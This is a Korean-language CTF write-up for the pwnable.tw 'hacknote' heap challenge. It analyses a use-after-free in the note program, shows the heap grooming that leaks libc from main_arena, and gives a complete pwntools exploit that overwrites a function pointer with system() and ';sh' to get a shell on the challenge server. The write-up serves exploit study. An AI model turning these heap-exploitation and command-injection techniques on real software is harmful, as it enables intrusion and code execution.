# [summary]
- free unsorted bin 시 잔존한 main_arena+48을 통해 libc leak
- uaf 취약점을 통한 eip control

# analysis
전형적인 uaf heap 문제임다.
```css
m444ndu@ubuntu:~/pwntw/hacknote$ checksec hacknote 
[*] '/home/m444ndu/pwntw/hacknote/hacknote'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
  
  

## add_note()
```c
  if ( note_num <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !ptr[i] )
      {
        ptr[i] = malloc(8u);
        if ( !ptr[i] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(_DWORD *)ptr[i] = sub_804862B;
        printf("Note size :");
        read(0, &buf, 8u);
        size = atoi(&buf);
        v0 = ptr[i];
        v0[1] = malloc(size);
        if ( !*((_DWORD *)ptr[i] + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)ptr[i] + 1), size);
        puts("Success !");
        ++note_num;
        return __readgsdword(0x14u) ^ v5;
```
일단 노트 추가는 5개밖에 못하고, `ptr[i]`를 통하여 노트를 관리합니당
`malloc()`을 총 두 번 사용해서 노트를 추가하는데, 첫 번째 `chunk`는 아래의 `sub_804862b()` 함수의 주소 4바이트와 문자열이 저장될 `heap 영역`의 주소 4바이트가 저장됩니다. `두 번째 chunk`는 사용자의 입력만큼의 크기를 갖는 `heap 영역`에 입력받은 `Content`를 저장합니다.
  
    
    
## sub_804862b()
```c
int __cdecl sub_804862B(int a1)
{
  return puts(*(const char **)(a1 + 4));
}
```

  
  
## print_note()
```c
  printf("Index :");
  read(0, &buf, 4u);
  index = atoi(&buf);
  if ( index < 0 || index >= note_num )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( ptr[index] )
    (*(void (__cdecl **)(void *))ptr[index])(ptr[index]);
  return __readgsdword(0x14u) ^ v3;
  ```
`print_note()` 함수에서 note의 값을 출력해주는 부분은 위의 `if( ptr[index] ){...}`인데, 다음과 같이 구현되어 있습니다.
```c
.text:08048915                 mov     eax, [ebp+index]
.text:08048918                 mov     eax, ds:ptr[eax*4]
.text:0804891F                 test    eax, eax
.text:08048921                 jz      short loc_8048942
.text:08048923                 mov     eax, [ebp+index]
.text:08048926                 mov     eax, ds:ptr[eax*4]
.text:0804892D                 mov     eax, [eax]
.text:0804892F                 mov     edx, [ebp+index]
.text:08048932                 mov     edx, ds:ptr[edx*4]
.text:08048939                 sub     esp, 0Ch
.text:0804893C                 push    edx
.text:0804893D                 call    eax
.text:0804893F                 add     esp, 10h
```
`*ptr[index]` 값을 주소로 하여 함수를 실행시키며, 인자로는 `ptr[index]`를 사용합니다.
기존에는 위의 `sub_804862b()`가 `*ptr[index]`의 값으로 있기 때문에, `puts(*(ptr[index]+4))`가 실행되는 것임미다.
`heap`을 요로저러해서 `*ptr[index]` 값을 바꿔준다면 `eip` 컨트롤이 가능하기 때문에, 해당 취약점을 메모해둡시당.

  
  
## delete_note()
```c
unsigned int delete_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= note_num )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( ptr[v1] )
  {
    free(*((void **)ptr[v1] + 1));
    free(ptr[v1]);
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```
이 함수는 그냥 `free`만 해줍니다. `free` 한 뒤 초기화를 하지 않습니다.

해당 문제에서 가장 극혐은 5개밖에 노트를 추가할 수 없다는 점인 것 같습니다.(+제가 푼 풀이에서만...)
한정된 횟수로 **leak**과 `eip` **컨트롤**을 하기 위해서는 열심히 짱구를 굴려야합니다. 다음과 같이 진행하면 될 것 같습니당. 
```
add(index=0,size=8)
add(index=1,size=256)
add(index=2,size=8)
delete(index=0)
delete(index=1)
delete(index=2)
add(index=3,size=256)
add(index=4,size=8)
==============================================================
index 0 {- size 8 -}                 index 3 {- size 8 -}  
      0 {- size 8 -}                 index 4 {- size 8 -}                                                                 
index 1 {- size 8 -}                       4 {- size 8 -}  
      1 {-- size 256 --}     =>            3 {-- size 256 --}
index 2 {- size 8 -}        
      2 {- size 8 -}      
```

위처럼 진행한다면, `index 3`에서 `main_arena + 48`를 **leak** 할 수 있고, `index 4`의 `content` 입력을 통해 `*ptr[1]`의 실행 함수 값을 바꿔줄 수 있읍니다.

아쉽게도 `one_gadget` 조건이 맞지 않았기 때문에, `system()` 함수와 `"/bin/sh"` 인자를 통해 익스를 할 수 밖에 없는 것 같습니다.

`*ptr[i]`에 `system()` 함수의 주소를 집어넣고, `ptr[i]`를 인자로 갖기 때문에, `ptr[i]+4` 값을 `";sh"`로 준다면 익스가 가능합니다. (ritsec ctf 2018에 이렇게 풀 수 있는 문제가 나왔던 거로 기억합니당) 


# exploit
```python
#! /usr/bin/python
from pwn import *

def add(size,data):
    r.sendlineafter('Your choice :','1')
    r.sendlineafter('Note size :',str(size))
    r.sendlineafter('Content :',data)

def delete(index):
    r.sendlineafter('Your choice :','2')
    r.sendlineafter('Index :',str(index))

def print_note(index):
    r.sendlineafter('Your choice :','3')
    r.sendlineafter('Index :',str(index))


#r = process('./hacknote', env={'LD_PRELOAD':'./libc_32.so.6'})
r = remote('chall.pwnable.tw',10102)
#context.log_level='debug'
#gdb.attach(r,'b* 0x080488A5')

add(8,'AAAA')    # 0
add(256,'BBBB')  # 1
add(8,'AAAA')    # 2
delete(0)
delete(1)
delete(2)

add(256,'BBB')   # 3


####### leak libc #######
print_note(3)
r.recvuntil('BBB\n')
leak = u32(r.recv(4))
libc_base = leak - 1779632+ 0x2000
success('libc_base = '+hex(libc_base))

system_addr = libc_base + 239936

payload = p32(system_addr)
payload += ';sh'

add(8,payload)     # 4

print_note(1)

r.interactive()
```
